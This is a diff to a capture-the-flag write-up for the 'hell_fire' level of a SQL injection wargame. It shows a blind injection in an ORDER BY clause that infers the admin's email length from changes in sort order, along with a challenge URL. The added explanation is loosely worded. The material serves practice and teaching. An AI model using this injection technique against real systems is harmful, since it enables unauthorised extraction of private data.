@@ -398,4 +398,14 @@ The ORDER BY keyword sorts the records in ascending order by default. To sort th
 select id,email,score from prob_hell_fire where 1 order by if(id='admin' AND length(email)=39, 1, 2)
 ```
 
+```
+https://los.rubiya.kr/chall/hell_fire_309d5f471fbdd4722d221835380bb805.php?email=admin%5Fsecure%5Femail@emai1.com
+```
+Checks if the id is 'admin' AND the length of their email equals to value 'a'
+If true, it orders by column 1; if false, it orders by column 2
+We can see a change in the sorting of results, confirming the length/brute force 
+```?email=admin%5Fsecure%5Femail@emai1.com```
 (PICTURE)
+
+---
+***
